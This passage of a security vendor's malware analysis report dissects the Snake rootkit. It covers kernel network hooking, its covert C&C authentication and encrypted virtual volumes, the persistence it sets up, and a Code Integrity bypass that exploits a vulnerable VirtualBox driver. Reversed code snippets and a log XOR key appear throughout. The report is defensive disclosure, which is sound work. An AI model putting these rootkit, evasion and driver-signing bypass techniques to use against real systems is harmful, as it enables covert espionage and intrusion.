\\BaseNamedObjects\\wininet_activate. When the data arrives, it is intercepted with the\nFwpsCopyStreamDataToBuffer0() API, and then scanned for the presence of the hidden commands from C&C.\n\nThe driver inspects bidirectional network data on a per stream basis, as it’s located right on the stream data path. An ability to\nmanipulate data streams is provided with the packet injection logic below, allowing Snake to covertly insert traffic destined to its\nC&C servers:\n\n```\n01\n02\n03\n04\n05\n06\n07\n08\n09\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n\n```\n```\nint __stdcall stream_inject(int flowHandle, int calloutId, int layerId)\n{\n  int iRet = 0;\n  int ntStatus = FwpsAllocateNetBufferAndNetBufferList(m_hNdisNblPool, 0, 0, 0, 0, &iRet);\n  if (!ntStatus)\n  {\n\n```\nntStatus = _FwpsStreamInjectAsync(m_hInjection,\n0,\n0,\nflowHandle,\ncalloutId,\nlayerId,\n20,\n3,\niRet,\n0,\nsStreamInjectCompletion,\n```\n                     0);\n  if (!ntStatus)\n  {\n    iRet = 0;\n  }\n  if (iRet)\n  {\n    FwpsFreeNetBufferList(iRet);\n  }\n  return ntStatus;\n\n```\n\n-----\n\n```\n01\n02\n03\n04\n05\n06\n07\n08\n09\n\n```\n```\nbool isBrowserProcess(const wchar_t *szProcName)\n{\n  return !wcsicmp(szProcName, L”iexplore.exe”) ||\n\n```\n!wcsicmp(szProcName, L”firefox.exe”) ||\n!wcsicmp(szProcName, L”opera.exe”) ||\n!wcsicmp(szProcName, L”netscape.exe”) ||\n!wcsicmp(szProcName, L”mozilla.exe”) ||\n!wcsicmp(szProcName, L”chrome.exe”);\n```\n}\n\n```\n\n##### TDI FILTER DRIVER\n\nIn addition to WFP, Snake also hooks the Transport Driver Interface (TDI) network routines by setting itself up as a TDI filter driver.\n\nTDI is considered deprecated and will be removed in future versions of Microsoft Windows, but it’s still supported on Windows 7.\n\nBeing registered as a TDI driver on the device stack, Snake hooks TCP calls. This way it intercepts all requests along with their\nparameters via IRP (IO request package) hooks.\n\nBy ‘sniffing’ all the requests, it can now inspect the traffic, looking for and then parsing GET/POST HTTP requests and also SMTP\ncommunications, in order to distinguish commands addressed to itself.\n\nIf the rootkit detects that the OS version is pre-Vista (e.g. Windows XP) or Windows Server 2008 (e.g. Windows Server 2003), it will\ninvoke FwpsStreamInjectAsync0() API in order to generate outbound requests.\n\nWhenever the client establishes connections, the TDI driver will also ‘pulse’ the \\BaseNamedObjects\\wininet_activate\nevent, just like the WPF driver’s component of it, in order to notify the userland service about the event.\n\nThe data that the driver intercepts, along with the important notifications, is passed to the userland DLL to be processed. If the\ndata contains commands from C&C, the DLL module is expected to execute them and report results back to the driver to be\ndelivered back to C&C.\n\n##### NDIS HOOKING\n\nFor NDIS versions 5.X, Snake rootkit contains code that installs NDIS filter intermediate driver.\n\nThis driver is set up above a miniport driver (a driver that communicates with the physical device) and below a protocol driver (a\ndriver that implements a protocol, e.g. TCP/IP).\n\nThe driver is registered with NdisIMRegisterLayeredMiniport() API.\n\nAfter that, the drivers hooks the following exports within ndis.sys:\n\n`•` NdisIMRegisterLayeredMiniport\n\n`•` NdisTerminateWrapper\n\nThe rootkit contains code that installs NDIS filter driver for NDIS 6.0 and above:\n\nUnique name: {c06b1a3b-3d16-4181-8c8d-7015bfc5b972}\n\nUser-readable description: filter_c06b1a3b\n\nNDIS filter driver configuration is stored in the registry entry:\n\nHKLM\\SYSTEM\\CurrentControlSet\\Control\\Network\\{4d36e974-e325-11ce-bfc1-08002be10318}\n\nThe driver is registered with NdisFRegisterFilterDriver() API.\n\n\n-----\n\n`•` NdisFRegisterFilterDriver\n\n`•` NdisFDeregisterFilterDriver\n\n`•` NdisSetOptionalHandlers\n\n`•` NdisFSetAttributes\n\nAnother set of exports it attempts to hook in ndis.sys (for NDIS 6.0) is:\n\n`•` NdisMRegisterMiniportDriver\n\n`•` NdisMDeregisterMiniportDriver\n\n`•` NdisMIndicateReceiveNetBufferLists\n\n`•` NdisMRestartComplete\n\n`•` NdisMPauseComplete\n\nWith the hooks installed, whenever the network adapter driver attempts to register to NDIS, or whenever there is an attempt to\ninstall NDIS intermediate driver or NDIS filter driver, the hook handlers will register Snake’s own MiniportXxx functions with the NDIS\nlibrary.\n\nWith its own miniport handler functions, it can send/receive data by using a private TCP/IP stack, bypassing all firewall hooks, and\nmaking its open ports invisible to scanners.\n\n##### NDIS PROTOCOL DRIVER\n\nThe Snake rootkit registers itself as Network Driver Interface Specification (NDIS) protocol driver.\n\nIntercepting Network Data Whenever the underlying miniport driver\nreceives data from the network, it calls NDIS\nby invoking a data receive indication function\n\nNdisMIndicateReceiveNetBufferLists()\n\nNdisMIndicateReceiveNetBufferLists().\n\n\nNDIS Protocol Miniport\nNDIS\nDriver Driver\n\nProtocolReceiveNetBufferLists()\n\nSending Network Data\n\nMiniportSendNetBufferLists()\n\nNDIS Protocol Miniport\n\nNDIS\n\nDriver Driver\n\nNdisSendNetBufferLists()\n\n\nWhen that happens, NDIS invokes Snake’s hook function\n(ProtocolReceiveNetBufferLists) to process the\nreceived data.\n\nTo send the data back, the protocol driver defines the data\nin a list of NET_BUFFER_LIST structures, and then passes\nthem to NDIS by calling NdisSendNetBufferLists().\n\nNDIS, in turn, calls the miniport driver’s\nMiniportSendNetBufferLists() function to forward\nthe data to an underlying miniport driver.\n\n|Col1|NDIS|\n|---|---|\n\n|Miniport Driver|Col2|\n|---|---|\n||Miniport Driver|\n|||\n\n|NDIS Protocol Driver|Col2|\n|---|---|\n\n|MiniportSendNetBufferLists()|Col2|\n|---|---|\n|Miniport NDIS Driver||\n|NDIS|Miniport Driver|\n\n\nNDIS\n\n\nNDIS Protocol\nDriver\n\n\nMiniport\nDriver\n\n\nBeing able to fully manipulate traffic at 3 different levels (NDIS protocol driver, TDI Driver, and WPF callout driver), Snake is able to\n‘inject’ the traffic into existing communications to reach out to external components, and at the same time parse all incoming traffic\nto detect traffic addressed to itself:\n\nInfected User Injected\n\nTraffic Interception Application Module\n0xDEADBEAF/0xC001BA5E\nChecks\nWFP      TDI       NDIS\n\nInternet Memory\n\npipes\n\n\nSnake’s Kernel Mode Driver\n\n\nMiniport\nDriver\n\n\nNDIS Protocol\nDriver\n\n\n-----\n\n##### DEAD BEEF ON A COOL BASE\n\nAs the driver intercepts all connections (e.g. on TDI_RECEIVE TDI event or ClientEventReceive() event notification triggered\nthrough its TDI Filter Driver), it parses all incoming HTTP and SMTP traffic to see if it can be authenticated as Snake traffic.\n\nThe authentication is implemented by decrypting the data and making sure it starts with the markers 0xDEADBEAF and\n0xC001BA5E (which appear to derive from ‘DEAD BEEF’ and ‘COOL BASE’).\n\nHere are specific steps:\n\n  - The data it accepts should start from a 10 byte signature with the following rules:\n\n     - the first 8 bytes must all be ASCII characters, the parser calculates their total sum (sum):\n\n```\n01\n02\n03\n04\n05\n06\n07\n08\n09\n10\n\n```\n```\nfor (int i = 0; i < 8; i++)\n{\n    if (*(BYTE *)ptrBuffer <= 32 ||\n      *(BYTE *)ptrBuffer >= 128)\n    {\n        return 0;         // if not ASCII, quit\n    }\n    sum += *(BYTE *)ptrBuffer;    // add to sum\n    ++ptrBuffer;           // advance buffer pointer\n}\n\n```\n\n\n- 9th byte must be equal to sum / 26 + 65\n\n- 10th byte must be equal to 122 - sum % 26\n\n```\n01\n02\n03\n04\n05\n\n```\n```\nif ((*(BYTE *)ptrBuffer != sum / 26 + 65) ||\n  (*(BYTE *)(ptrBuffer + 1) != 122 - sum % 26))\n{\n    result = 0;\n}\n\n```\n\n\n- Starting from the 11th byte, the data must be base64-encoded; the parser decodes that data\n\n```\n01\n02\n03\n\n```\n\nbase_64_decode(abyBuffer + 10,\n&ptrDecoded,\n```\n        iMaxLength - 10);\n\n```\n\n\n- Once decoded, the decrypted data should contain the aforementioned markers:\n\n\n.text:F6751426   lea   eax, [ebp+dwMarker]       ; return marker here\n.text:F6751429   push   eax\n.text:F675142A   mov   ecx, [ebp+buf_len]        ; traffic’s buffer length\n.text:F675142D   push   ecx\n.text:F675142E   mov   edx, [ebp+abyBuffer]       ; traffic’s buffer pointer\n.text:F6751431   push   edx\n.text:F6751432   call   decrypt_traffic          ; decrypt traffic first\n.text:F6751437   test   eax, eax\n.text:F6751439   jz    short exit            ; if failed, exit\n.text:F675143B   mov   eax, [ebp+dwMarker]       ; check the returned marker\n.text:F675143E   cmp   eax, _DEADBEAF ; _DEADBEAF dd 0DEADBEAFh\n.text:F6751444   jnz   short exit            ; if not 0xDEADBEAF, exit\n.text:F6751446   cmp   [ebp+dwNextDword], 0C001BA5Eh  ; check next DWORD\n.text:F675144D   jnz   short next            ; if not 0xC001BA5E, exit\n\n\n\n- When the traffic is authenticated, its contents is then parsed by using “GET”, “POST”, “http://”, “HTTP/”,\n“Content-Length”, “Connection”, “close” tags, in order to retrieve HTTP requests\n\n- SMTP traffic is also parsed, only by using “MAIL “, “RCPT “ tags in order to retrieve SMTP characteristics\n\n\n-----\n\nserver processing client traffic, and serving back normal responses as per the protocol?\n\nFor example, in HTTP the driver will respond with messages like “HTTP/1.1 200 OK” or “HTTP/1.1 500 Server Error”.\n\nFor SMTP traffic, it communicates back normal SMTP server responses, such as “250 Sender OK”, “503 Bad sequence of\n```\ncommands”, etc.\n\n```\nThe reason behind such behaviour is that the driver is acting in this mode like a proxy, routing requests from other infected hosts to\na remote C&C server.\n\nAnother opportunity this mode unlocks is a peer-to-peer network mode with no centralised C&C. The infected hosts are capable\nof transferring the following peer-2-peer commands defining fragment size, reliability parameters, new peer information, peer\nimpersonation flags, etc.:\n\n`•` frag_size\n\n`•` frag_no_scrambling\n\n`•` peer_frag_size\n```\n  • read_peer_nfo\n\n```\n`•` write_peer_nfo\n\n`•` imp_level\n\n`•` reliable_n_tries\n\n`•` reliable_keepalive\n\n`•` reliable_rtt\n\n`•` reliable_padding\n\n`•` reliable_no_keepalive\n\n`•` m2b_raw\n```\n  • psk\n\n```\n`•` key\n\nOnce the incoming data is authenticated and decrypted, the driver passes it to the DLL by using memory pipes.\n\nFor example, on HTTP traffic arrival it may send traffic data into a memory pipe \\Device\\NamedPipe\\isapi_http, and then,\nsend a received peer-2-peer command message write_peer_nfo=[IP_ADDRESS:PORT]0frag_no_scrambling=Y0 into\nanother memory pipe called \\Device\\NamedPipe\\isapi_dg.\n\nIn order to log its activity, the driver writes log data into the pipe \\Device\\NamedPipe\\isapi_log, so that the DLL could log the\ndata into the log files.\n\nFull list of the named pipes used for communications is provided below:\n\n`•` \\Device\\NamedPipe\\isapi_http\n\n`•` \\Device\\NamedPipe\\isapi_log\n\n`•` \\Device\\NamedPipe\\isapi_dg\n\n`•` \\Device\\NamedPipe\\services_control\n\nMessages submitted into the pipes are wrapped into the structures. The structures appear to contain headers to allow the pipe\nserver, that runs within an infected userland module, to identify the messages first and then unwrap the structures accordingly.\n\nFor example, the message headers could be:\n\n`•` domc.np\n\n`•` frag.np\n\nOnce received from the pipes and unwrapped/decoded, the data is then handled by the usermode DLL as per the data intention whether it’s a traffic sniffing task, a peer-2-peer client logic, a logging task, or a task of saving received files into the virtual volumes.\n\n\n-----\n\n##### VIRTUAL FILE VOLUMES\n\nThe driver creates virtual file volumes for encrypted storage of its files and configuration data:\n\n`•` \\\\.\\Hd1\n\n`•` \\\\.\\Hd2\n\nThe volumes are mounted from the virtual file systems RawDisk1 and RawDisk2.\n\nThe first partition is created with the following steps:\n\n  - the driver creates a 100Mb (0x6400000 bytes) file %windows%\\$NtUninstallQ817473$\\hotfix.dat by calling\nIoCreateFile() API\n\n  - then it creates a section object with the flags SEC_COMMIT and SEC_NOCACHE (0x18000000) by calling\nZwCreateSection(); the flags mean the file is mapped into memory, the entire range of pages will be committed\n\n  - next, it maps a view of the created section into the virtual address space by calling ZwMapViewOfSection()\n\n  - finally, it creates device \\Device\\RawDisk1 from the section map and mounts it as \\\\.\\Hd1\n\nThe hook installed by the rootkit on IofCallDriver() API provides on-the-fly data encryption/decryption whenever that data is\nwritten to or read from the volume. The encryption algorithm is based on CAST-128, with the hard-coded key stored in the rootkit\nbody.\n\nAs a result, whenever the data is saved into the volume Hd1, it will be scrambled on-the-fly, and reflected in the persistent storage\nfile hotfix.dat, which is physically located within the rootkit’s ‘home’ directory:\n\n\nZ:\\WINDOWS\\$NtuninstallQ817473$>dir\n\nVolume in drive Z has no label.\n\nVolume Serial Number is 2479-98AC\n\nDirectory of Z:\\WINDOWS\\$NtuninstallQ817473$\n\n13/02/2014 04:47 PM  <DIR>     .\n\n13/02/2014 04:47 PM  <DIR>     ..\n\n03/02/2014 01:57 PM      210,944 fdisk.sys\n\n13/02/2014 04:47 PM    104,857,600 hotfix.dat\n\n2 File(s)  105,068,544 bytes\n\n2 Dir(s)  8,406,433,792 bytes free\n\n\nAnalysis of the hotfix.dat file contents reveals it’s a fully encrypted file with flat entropy. Thus, it is not possible to reveal the\ncontents of the Snake’s volume by accessing the contents of this file (unless the encryption is broken, that is).\n\nEnlisting the contents of the created volume is possible, along with creating files on it:\n\n\nC:\\>echo Test > \\\\.\\Hd1\\Test.txt\n\nC:\\>type \\\\.\\Hd1\\\\Test.txt\n\nTest\n\nC:\\>dir \\\\.\\Hd1\\\\\n\nVolume in drive \\\\.\\Hd1 has no label.\n\nVolume Serial Number is BA9B-99E8\n\nDirectory of \\\\.\\Hd1\n\n14/02/2014 02:22 PM         7 Test.txt\n\n1 File(s)       7 bytes\n\n0 Dir(s)        0 bytes free\n\n\n-----\n\ndecrypt the scrambled volume:\n\n\nC:\\>dir \\\\.\\Hd1\\\\\n\nIncorrect function.\n\n\nThe second volume \\\\.\\Hd2 is not mapped to a file, so when a computer is switched off, its contents is lost. Thus, it could be\nused as a temporary or a cache storage. The data stored in \\\\.\\Hd2 is encrypted the same way the first volume’s data.\n\nBoth volumes appear to be set up as FAT volumes.\n\nAn attempt to read the data from these volumes with the code below:\n\n```\n01\n02\n03\n04\n05\n06\n07\n08\n09\n10\n11\n12\n13\n14\n15\n\n```\n```\nHANDLE hDisk = CreateFile(“\\\\\\\\.\\\\Hd1”,\n\n```\nGENERIC_READ,\nFILE_SHARE_READ,\nNULL,\nOPEN_EXISTING,\n0,\n```\n              NULL);\nBYTE lpBuffer[16384];\nDWORD dwBytes;\nif (hDisk)\n{\n\n```\nReadFile(hDisk, lpBuffer, 16384, &dwBytes, NULL);\n```\n    // inspect the buffer\n    CloseHandle(hDisk);\n}\n\n```\n\nThis will produce the following results:\n\nFor \\\\.\\Hd1:\n\n\n0 1 2 3 4 5 6 7 8 9 A B C D E F 0123456789ABCDEF\n\n\n00000000 EB 00 00 00 00 00 00 00 00 00 00 00 02 04 02 00 ................\n00000010 02 00 02 00 00 F8 C8 00 20 00 02 00 01 00 00 00 ........ .......\n00000020 FF 1F 03 00 80 00 29 E8 99 9B BA 4E 4F 20 4E 41 ......)....NO NA\n00000030 4D 45 20 20 20 20 46 41 54 31 36 20 20 20 00 00 ME  FAT16  ..\n00000040 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\n\n\nFor \\\\.\\Hd2:\n\n\n0 1 2 3 4 5 6 7 8 9 A B C D E F 0123456789ABCDEF\n\n\n00000000 EB 00 00 00 00 00 00 00 00 00 00 00 02 01 02 00 ................\n00000010 02 00 02 FF 7F F8 7F 00 20 00 02 00 01 00 00 00 ........ .......\n00000020 00 00 00 00 80 00 29 E8 99 9B BA 4E 4F 20 4E 41 ......)....NO NA\n00000030 4D 45 20 20 20 20 46 41 54 31 36 20 20 20 00 00 ME  FAT16  ..\n00000040 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\n\n\nThe ability to keep its data on TrueCrypt-like volumes provides Snake with a powerful ability to exchange data with the usermode\nDLL, as these volumes are accessible both from usermode and kernel mode.\n\nStatic analysis of the code reveals that the Snake driver uses virtual volumes to store its data and additional files on it.\n\nFor example, it stores its message queue in a file called:\n\n\\.\\\\Hd1\\queue\n\nThe message queue indicates an asynchronous communication model between kernel mode driver and a usermode DLL,\ne.g. to pass commands, configuration parameters, binary images of additional Snake components.\n\nOther files that may also be found on the virtual volume are: klog, conlog, dump, rkng_inst.exe,\n\nwhere rkng_inst.exe could be the name of the original dropper, and other log files could potentially contain executed command\noutputs, intercepted keystrokes, and other output logs.\n\n\n-----\n\n##### 64-BIT EDITIONS OF WINDOWS\n\nThe 64-bit version of Snake must deal with a number of additional security protections implemented in 64-bit editions of Microsoft\nWindows, the most significant of which are kernel driver signature validation and Kernel Patch Protection (more commonly known as\nPatchGuard).\n\nPatchGuard is a feature of 64-bit Windows which aims to prevent modification of the Windows kernel, something that is often\nperformed by malware attempting to hide itself on an infected system. Although PatchGuard is successful at preventing kernel\n\npatching once initialised, several published bypass approaches exist[4,5]. The technique used by Snake appears to be similar to these\napproaches.\n\nThe driver signing policy enforced by all 64-bit versions of Windows from Vista onwards requires all kernel-mode drivers to be signed\nwith a valid digital signature. The Snake dropper contains both 32-bit and 64-bit unsigned drivers, and it can successfully load its\nunsigned 64-bit driver on a 64-bit version of Windows XP – as driver signing is not enforced it does not have to resort to any tricks\nunder this OS version. In this case, in order to ensure the driver is loaded automatically at startup, the dropper can install the 64-bit\ndriver on 64-bit Windows XP in the same way it installs a 32-bit driver on a 32-bit version of Windows XP.\n\nOn 64-bit versions of Windows Vista and above it behaves differently. Firstly, the 64-bit unsigned driver file is created as usual:\n\n%windows%\\$NtUninstallQ817473$\\fdisk.sys\n\nHowever, the driver is not registered; what is registered instead is the dropper itself. To do that, the dropper first copies itself as:\n\n%windows%\\$NtUninstallQ817473$\\fdisk_mon.exe\n\nThe dropper then registers itself as a service to ensure it starts every time Windows is booted, by creating the values:\n\nErrorControl = 0\nType = 16\nStart = 2\nImagePath = ”%SystemRoot%\\$NtUninstallQ817473$\\fdisk_mon.exe\nObjectName = ”LocalSystem”\nWOW64 = 1\n\nin the registry key:\n\nHKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\Ultra3\n\nNow comes the most interesting part: does the dropper manage to load its 64-bit unsigned driver under 64-bit versions of Windows\nVista and later versions, such as 64-bit Windows 7/8? The answer: Yes, it does.\n\nDoes it resort to using bootkit technology, which has been used in the past to bypass protections to load unsigned 64-bit drivers?\nThe answer: No. Bootkits must overwrite the Master Boot Record (MBR) and antivirus products are well trained to catch that kind of\nbad behavior.\n\nThe masterminds behind Snake rootkit seem to be well aware of this so what they resorted to instead is leveraging a vulnerability\nin a well-known virtualization product called VirtualBox, a product made by Oracle which is widely used by researchers to analyse\nmalware. VirtualBox driver version 1.6.2 was released in June 2, 2008. Two months later, in August 2008, security researchers\nreported that its main driver component, which is signed under the entity “innotek Gmbh”, contained a privilege escalation\n\nvulnerability[6].\n\nIn a nutshell, the VirtualBox software installs a driver called VBoxDrv. The driver is controlled with the Input/Ouput Control Codes\n(32-bit values called IOCTL) passed along DeviceIoControl() API. One of the documented transfer methods that the system\nuses to pass data between the caller of DeviceIoControl() API and the driver itself is called METHOD_NEITHER.\n\nAs per MSDN documentation[7], METHOD_NEITHER is a special transfer type when Input/Output Request Packet (IRP) supplies the\nuser-mode virtual addresses of the input and output buffers, without validating or mapping them.\n\n4 [http://www.codeproject.com/Articles/28318/Bypassing-PatchGuard-3](http://www.codeproject.com/Articles/28318/Bypassing-PatchGuard-3)\n5 [http://uninformed.org/index.cgi?v=3&a=3&p=17](http://uninformed.org/index.cgi?v=3&a=3&p=17)\n6 [http://www.coresecurity.com/content/virtualbox-privilege-escalation-vulnerability](http://www.coresecurity.com/content/virtualbox-privilege-escalation-vulnerability)\n7 [http://msdn microsoft com/en us/library/windows/hardware/ff543023(v=vs 85) aspx](http://msdn.microsoft.com/en-us/library/windows/hardware/ff543023(v=vs.85).aspx)\n\n\n-----\n\nusermode addresses.\n\nThe source code of the vulnerable driver (shown below) demonstrates how the integer value of the rc variable is first derived from\nthe input parameters pDevObj (device object) and pIrp (request packet). Next, that integer value is written into the UserBuffer - an\narbitrary address, pointed by the input parameter pIrp (request packet). As there are no validations made for the UserBuffer an\nattacker can craft such input parameters that will define address within kernel memory to patch and the data to patch it with:\n\n```\n01\n02\n03\n04\n05\n06\n07\n08\n09\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n\n```\n```\n  ULONG ulCmd = pStack->Parameters.DeviceIoControl.IoControlCode;\n  if ( ulCmd == SUP_IOCTL_FAST_DO_RAW_RUN\n   || ulCmd == SUP_IOCTL_FAST_DO_HWACC_RUN\n   || ulCmd == SUP_IOCTL_FAST_DO_NOP)\n  {\n   int rc;\n     ...\n\n```\nrc = supdrvIOCtlFast(ulCmd, pDevExt, pSession);\n```\n     // supdrvIOCtlFast() function itself will return:\n\n```\n// pDevExt->pfnVMMR0EntryFast(pSession->pVM, SUP_VMMR0_DO_NOP);\n// the function depends pDevExt and pSession, which in turn\n```\n     // are derived from the input parameters pDevObj and pIrp\n\n```\n// therefore, rc value can be manipulated\n```\n   __try\n   {\n                       // save the manipulated rc value back into\n     *(int *)pIrp->UserBuffer = rc;  // the input parameter (the address to patch)\n   }\n   __except(EXCEPTION_EXECUTE_HANDLER)\n   {\n     ...\n   }\n  }\n}\n\n```\n\nNow that the vulnerable driver can be used as a weapon to patch kernel memory, all the malware needs to do is to patch the content\nof the variable nt!g_CiEnabled, a boolean variable “Code Integrity Enabled” that marks whether the system was booted in\nWinPE mode.\n\nWhen running in WinPE mode there is no Code Integrity control, therefore by enabling this mode by patching only one bit,\nCode Integrity verification is disabled so that the unsigned 64-bit driver can be loaded.\n\nThis variable is used within the function SepInitializeCodeIntegrity(), implemented within CI.dll’s function\nCiInitialize() and imported by the NT core (ntoskrnl.exe). In order to find the variable in kernel memory, the Snake\ndropper loads a copy of the NT core image (ntoskrnl.exe), locates the import of CI.dll’s function CiInitialize(), and then\nSepInitializeCodeIntegrity() within it. Then it parses the function’s code to locate the offset of the variable.\n\nOnce located, the content of the variable nt!g_CiEnabled is patched in kernel memory and the 64-bit unsigned driver is loaded.\nThis explains why Snake dropper registers itself as a service to start each time Windows starts: in order to install the vulnerable\nVBox driver first, then pass it a malformed structure to disable Code Integrity control with a DeviceIoControl() API call, and\nfinally, load the driver.\n\nIn order to be able to perform the steps above, the dropper must first obtain Administrator privileges. It attempts to do this by\nrunning MS09-025 and MS10-015 exploits on the target system. These exploits are bundled within the dropper in its resource\nsection as executable files. Other resources embedded within the dropper are the 32-bit and 64-bit builds of its driver, a tool for\ncreating NTFS file systems, and the initial message queue file which is written into the virtual volume. The message queue file\ncontains configuration data and the libraries that will be injected into usermode processes.\n\n\n-----\n\n##### USERMODE DLLS\n\nThe usermode DLLs injected by the kernel-mode driver into the userland system process (e.g. explorer.exe) are:\n\n  - 32-bit Windows OS:\n\n`•` rkctl_Win32.dll\n\n`•` inj_snake_Win32.dll\n\n  - 64-bit Windows OS:\n\n`•` rkctl_x64.dll\n\n`•` inj_snake_x64.dll\n\nThe rkctl_Win32.dll/rkctl_x64.dll module uses the following hard-coded named pipe for communications:\n\\\\.\\pipe\\services_control\n\nThe remote commands it receives appear to be designed to control other components of Snake:\n\n\n\n`•` tc_cancel\n\n`•` config_read_uint32\n\n`•` tr_free\n\n`•` tr_alloc\n\n`•` tc_send_request\n\n`•` tr_write_pipe\n\n`•` snake_modules_command\n\n`•` t_setoptbin\n\n\n\n`•` tc_free_data\n\n`•` tc_get_reply\n\n`•` tc_read_request_pipe\n\n`•` tc_send_request_bufs\n\n`•` t_close\n\n`•` tc_socket\n```\n• snake_free\n\n```\n`•` snake_alloc\n\n\nThe inj_snake_Win32.dll/inj_snake_x64.dll module exports 61 functions. It is designed to perform the high-level tasks\nsuch as:\n\n  - manage the configuration data (by using a queue)\n\n  - exfiltrate data by using Windows Internet (WinINet) APIs or Windows Sockets 2 (Winsock) APIs:\n\n     - communicate with the C&C server and receive commands to execute\n\n     - submit logs to the C&C server and other reports\n\nWhen the DLL activates, it reads configuration parameters from the configuration queue, that the driver creates on a virtual volume.\nOne of the parameters defines the pipe name(s) that the DLL should use for its communications.\n\nThe remote commands received by this Snake DLL module are designed to set up various communication parameters:\n\n\n\n`•` http_log\n\n`•` http_no_pragma_cache\n\n`•` http_no_accept\n\n`•` proxy_useragent\n\n`•` proxy_bypass\n\n`•` proxy_server\n\n`•` proxy_discover\n\n`•` proxy_passwd\n\n`•` proxy_user\n\n`•` check_inet\n\n\n\n`•` redir_str\n\n`•` http_max_opt\n\n`•` http_option\n\n`•` http_uri\n\n`•` no_server_hijack\n\n`•` imp_level\n\n`•` net_password\n\n`•` net_user\n\n`•` write_peer_nfo\n```\n• read_peer_nfo\n\n```\n\nTo post the data, the DLL can use the following User-Agent string “Mozilla/4.0 (compatible; MSIE 6.0)”.\nIt may rely on the following Internet Media types (MIME types) for data exfiltration:\n\n\n\n`•` application/x-shockwave-flash\n\n`•` image/pjpeg\n\n`•` image/jpeg\n\n`•` image/x-xbitmap\n\n\n\n`•` image/gif\n\n`•` application/msword\n\n`•` application/vnd.ms-excel\n\n`•` application/vnd.ms-powerpoint\n\n\nRequest type it uses can either be POST of GET, and C&C server resource name is /default.asp.\n\n\n-----\n\n##### RECONNAISSANCE TOOL\n\nOne of the Snake components that could have been downloaded from a remote C&C server, was identified as a network\nreconnaissance tool.\n\nWhen run as a command line tool, with its logic defined with the command line switches, this tool enumerates other network hosts\nand detects what Windows RPC services are enabled at the endpoints. It carries a list of interface identifiers associated with\nthe named pipes. It then uses these identifiers to write a message to and read a message from the associated named pipes. By\nknowing what RPC services are running, it can successfully fingerprint all network hosts by mimicking the Metasploit’s logic of OS\nfingerprinting via SMB. The fingerprinting allows it to reveal the following characteristics for each host found in the network:\n\n  - the version of the operating system\n\n  - version of the service pack\n\n  - the installed network services\n\nThe data it retrieves is encrypted and saved into a configuration file %system%\\vtmon.bin. This file is then further encrypted with\nan NTL-based (Number Theory Library) algorithm and is uploaded by the usermode-centric Snake rootkit to the C&C server, along\nwith other configuration files, such as mtmon.sdb, mtmon32.sdb, gstatsnd.bin, gstat.bin, gstat32.bin, and other log\nfiles found in the %windows%\\$NtUninstallQ[random]$ directory.\n\nBy using this function the remote attacker can identify any potentially exploitable hosts located in the same network as the victim.\nThe attacker may then craft an exploit against those hosts, possibly by using the Metasploit framework, and then deliver the\ngenerated shellcode back to the reconnaissance tool to be applied against the identified hosts by running the tool with the\n‘exp_os’ switch.\n\nIf the tool successfully delivers the payload and exploits the remote host(s), it will replicate the infection across the network, taking\ncontrol over new hosts, thus repeating the infection cycle all over again and spreading the infection further. Unlike traditional worm\ntechniques, this process is rather manual, but its danger is in the fact that the attacker can flexibly craft new attack methods,\nadjusting them to the hosts present within the network, thus preying on the weakest (least updated, most vulnerable) victims along\nits path.\n\n\n-----\n\n##### RELATIONSHIP TO AGENT.BTZ\n\nAs seen from the check-in logs found within one of the recent samples, the time span covers almost 6 years from January 2007 till\nDecember 2012, which is aligned with the first reports of Agent.BTZ. It’s worth noting that Agent.BTZ used the same XOR key for its\nlogs as the most recent variants:\n\n1dM3uu4j7Fw4sjnbcwlDqet4F7JyuUi4m5Imnxl1pzxI6as80cbLnmz54cs5Ldn4ri3do5L6gs923HL34x2f5cvd0fk6c1a0s\n\nLog files created by the latest samples of Snake, compiled in 2013 and 2014, were successfully decrypted with the same XOR key.\n\nOther similarities include the usage of the virtual partition \\\\.\\Vd1, the temporary file named FA.tmp, usage of files named\nmswmpdat.tlb, wmcache.nld, winview.ocx.\n\n##### CONCLUSION\n\nThe cyber-espionage operation behind the Snake rootkit is well established, a sample comiled in January 2006 indicates that\nthe activity would have begun in at least 2005. It is also sophisticated, using complex techniques for evading host defences and\nproviding the attackers covert communication channels. Toolmarks left behind by the authors ‘vlad’ & ‘gilg’, leave tantalizing clues\nas to the personas behind this.\n\nFrom a technical perspective, Snake demonstrates two very different approaches to the task of building a cyber-espionage toolkit.\nOne approach is to delegate the network communication engine to usermode code, backed up by a usermode rootkit. Another\napproach is to carry out all of the communications from the kernel-mode driver, which is a very challenging task by itself.\n\nThe complexity of the usermode-centric approach is on par with Rustock rootkit - it uses similar techniques. It’s an old well-polished\ntechnology that evolved over the years and demonstrated its resilience and survivability under the stress of security countermeasures. The complexity of the kernel-centric architecture of Snake is quite unique. This architecture is designed to grant Snake\nas much flexibility as possible. When most of the infected hosts are cut off from the outside world, it only needs one host to be\nconnected online. The traffic is then routed through that host to make external control and data exfiltration still possible.\n\nThe presence of the reconnaissance tool in the Snake operators’ framework suggests the existence of an arsenal of infiltration\ntools, designed to compromise a system, then find a way to replicate into other hosts, infect them, and spread the infection\neven further. As demonstrated, the backdoor commands allow Snake to provide remote attackers with full remote access to the\ncompromised system. Its ability to hibernate, staying fully inactive for a number of days, makes its detection during that time very\ndifficult.\n\nThe analysed code suggests that even file system and registry operations can be delegated by an infected module to another\nmodule in order to stay unnoticed by behaviour analysis engines of the antivirus products, and to overcome account restrictions of\nthe browser processes so that the injected module could still write into files and into the sensitive registry hives.\n\nThe logs and dumps it creates on the hidden virtual volumes contributes to its stealthiness too. A great deal of attention has also\nbeen given to keep its network communications as quiet as possible. Its ability to generate malicious traffic whenever the user\ngoes online and start loading the web pages allows it to ‘blend in’ with the legitimate communications.\n\nWe expect much more will be uncovered by researchers in the coming weeks as the capabilities of this operation are further fleshed\nout. However, as we implied in the opening section, we view this threat to be a permanent feature of the landscape. Whether they\ndismantle this toolset and start from scratch, or continue using tools which have been exposed, remains to be seen. For their\ntargets though the considerable challenge of keeping secrets safe on sensitive networks will certainly continue for years to come.\n\n##### RECOMMENDATIONS\n\n  - Search logs for connections to Snake’s command and control servers (see Appendix A)\n\n  - Search for MD5 hashes of the known samples (see Appendix 